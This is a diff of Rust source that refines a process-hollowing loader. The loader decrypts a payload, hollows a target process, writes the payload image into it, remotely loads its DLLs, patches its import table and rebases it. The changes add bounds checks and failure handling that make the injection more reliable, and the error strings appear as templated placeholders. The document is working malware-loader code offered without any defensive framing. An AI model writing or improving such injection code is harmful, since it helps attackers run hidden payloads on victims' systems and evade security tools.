@@ -164,6 +164,15 @@ fn parse_pe(image: &[u8]) -> Result<Pe, String> {
     let size_of_image = read_u32(image, opt + 56)?;
     let size_of_headers = read_u32(image, opt + 60)?;
 
+    // Both sizes are validated here so the write path cannot slice past the
+    // decrypted buffer or write past the target's allocation after the hollow.
+    if size_of_image == 0 || size_of_image < size_of_headers {
+        return Err($MSG_BAD_IMAGE_SIZE$);
+    }
+    if size_of_headers as usize > image.len() {
+        return Err($MSG_HEADERS_OOB$);
+    }
+
     // Base relocation directory (data directory index 5).
     let num_dirs = read_u32(image, opt + NUM_DIRECTORIES_OFFSET)?;
     let (reloc_rva, reloc_size) = if num_dirs > 5 {
@@ -234,8 +243,12 @@ fn rva_to_offset(pe: &Pe, rva: u32) -> Option<usize> {
 }
 
 fn apply_relocations(image: &mut [u8], pe: &Pe, delta: u64) -> Result<(), String> {
+    // Only called when the allocation landed away from `ImageBase`. An image
+    // with no relocation table cannot be rebased: every absolute pointer in it
+    // still holds the preferred base, so claiming success would run the payload
+    // with a broken image. Refuse instead.
     if pe.reloc_size == 0 {
-        return Ok(());
+        return Err($MSG_NO_RELOCATIONS$);
     }
     let start = rva_to_offset(pe, pe.reloc_rva)
         .ok_or_else(|| $MSG_RELOC_TABLE_UNMAPPED$)?;
@@ -311,7 +324,14 @@ fn resolve_and_patch_imports(image: &mut [u8], pe: &Pe) -> Result<usize, String>
     for (iat_rva, address) in imports {
         let offset = rva_to_offset(pe, iat_rva)
             .ok_or_else(|| format!("{} 0x{iat_rva:08x}", $MSG_IAT_SLOT_NOT_MAPPED$))?;
+        // The slot width follows the image: `parse_pe` rejects a payload whose
+        // machine differs from the stub's, so a 32-bit stub always patches a
+        // 4-byte IAT. Writing 8 bytes into a PE32 table would spill into the
+        // next import's slot.
+        #[cfg(target_arch = "x86_64")]
         write_u64(image, offset, address)?;
+        #[cfg(target_arch = "x86")]
+        write_u32(image, offset, address as u32)?;
     }
     Ok(count)
 }
@@ -686,11 +706,14 @@ fn imported_dll_names(image: &[u8], pe: &Pe) -> Result<Vec<String>, String> {
         if name_rva != 0 {
             let name_off = rva_to_offset(pe, name_rva)
                 .ok_or_else(|| $MSG_DLL_NAME_UNMAPPED$)?;
-            let end = image[name_off..]
+            let tail = image
+                .get(name_off..)
+                .ok_or_else(|| $MSG_DLL_NAME_UNMAPPED$)?;
+            let end = tail
                 .iter()
                 .position(|&b| b == 0)
                 .ok_or_else(|| $MSG_DLL_NAME_UNTERMINATED$)?;
-            let name = String::from_utf8_lossy(&image[name_off..name_off + end]).into_owned();
+            let name = String::from_utf8_lossy(&tail[..end]).into_owned();
             if !names.contains(&name) {
                 names.push(name);
             }
@@ -751,9 +774,25 @@ fn load_imports_in_target(process: HANDLE, image: &[u8], pe: &Pe) -> Result<(), 
             return Err(nt_error(format!("{} '{display}'", $MSG_LOAD_DLL_FAILED$), status));
         }
         let status = crate::nt_wait_for_single_object(thread, u32::MAX);
-        let _ = crate::nt_close(thread);
         if status < 0 {
+            let _ = crate::nt_close(thread);
             return Err(nt_error(format!("{} '{display}'", $MSG_DLL_LOAD_UNFINISHED$), status));
+        }
+        // `LoadLibraryA`'s return value is the module handle, delivered as the
+        // thread's exit status; NULL means the load failed. Only NULL is a
+        // failure: the status is the low half of a 64-bit handle, so a valid
+        // handle such as `0x180000000` reads back as a negative `i32`. A failed
+        // load must abort: the session-wide addresses resolved later are only
+        // valid in the target if the DLL is really mapped there.
+        let info = thread_basic_information(thread);
+        let _ = crate::nt_close(thread);
+        let info = info?;
+        if info.exit_status == 0 {
+            return Err(format!(
+                "{} '{display}' (0x{:08x})",
+                $MSG_LOAD_DLL_FAILED$,
+                info.exit_status as u32
+            ));
         }
         crate::tech_dbg!(
             "process_hollowing",
@@ -784,20 +823,30 @@ fn read_remote<T: Copy>(process: HANDLE, address: u64, value: &mut T) -> Result<
 }
 
 fn write_image(process: HANDLE, base: u64, image: &[u8], pe: &Pe) -> Result<(), String> {
-    // Headers first.
-    write_remote(process, base, &image[..pe.size_of_headers as usize])?;
-    // Then each section.
+    // Headers first. `parse_pe` has already checked them against the buffer;
+    // `get` keeps a later parser change from turning this into a panic after
+    // the target has been hollowed.
+    let headers = image
+        .get(..pe.size_of_headers as usize)
+        .ok_or_else(|| $MSG_HEADERS_OOB$)?;
+    write_remote(process, base, headers)?;
+    // Then each section. Both the source range and the destination RVA are
+    // clamped to the allocation, so a malformed section cannot write into
+    // unrelated committed memory of the target.
     for sec in &pe.sections {
-        let start = sec.pointer_to_raw_data as usize;
-        let end = start + sec.size_of_raw_data as usize;
-        if end > image.len() {
-            return Err($MSG_SECTION_DATA_OOB$);
+        let available = pe.size_of_image.saturating_sub(sec.virtual_address) as usize;
+        let length = (sec.size_of_raw_data as usize).min(available);
+        if length == 0 {
+            continue;
         }
-        write_remote(
-            process,
-            base + sec.virtual_address as u64,
-            &image[start..end],
-        )?;
+        let start = sec.pointer_to_raw_data as usize;
+        let end = start
+            .checked_add(length)
+            .ok_or_else(|| $MSG_OFFSET_OVERFLOW$)?;
+        let data = image
+            .get(start..end)
+            .ok_or_else(|| $MSG_SECTION_DATA_OOB$)?;
+        write_remote(process, base + sec.virtual_address as u64, data)?;
     }
     Ok(())
 }
